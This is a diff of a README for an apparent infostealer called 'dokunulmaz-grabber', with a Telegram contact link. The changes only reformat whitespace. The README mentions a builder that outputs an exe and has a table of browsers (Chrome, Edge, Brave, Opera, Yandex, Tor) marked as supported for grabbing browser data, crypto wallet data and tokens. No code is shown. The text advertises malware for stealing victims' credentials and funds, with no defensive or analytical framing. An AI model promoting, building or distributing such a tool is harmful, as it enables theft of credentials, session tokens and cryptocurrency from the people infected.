@@ -1,4 +1,4 @@
-# ⚔️dokunulmaz-grabber👹
+# ⚔️ dokunulmaz-grabber 👹
 t.me/dokunulmazgrabber
 
 
@@ -80,20 +80,33 @@ Follow instructions in builder and your exe will be found in the dist folder und
 
 # Prerequisites
 • Windows 10
+
 • python
+
 • github
 
 
+
 # Browser 
-Browsers	Browser Data	Crypto Data	Token Grab
+Browsers	Browser
+Data	Crypto Data	Token Grab
+
 Chrome	✅	✅	✅
+
 Edge	✅	✅	✅
+
 Brave	✅	✅	✅
+
 Opera GX	✅	✅	✅
+
 Opera	✅	✅	✅
+
 Yandex	✅	✅	✅
+
 Firefox	❌ ❌ ❌
+
 Tor Browser ✅ ✅ ✅
+
 
 
 
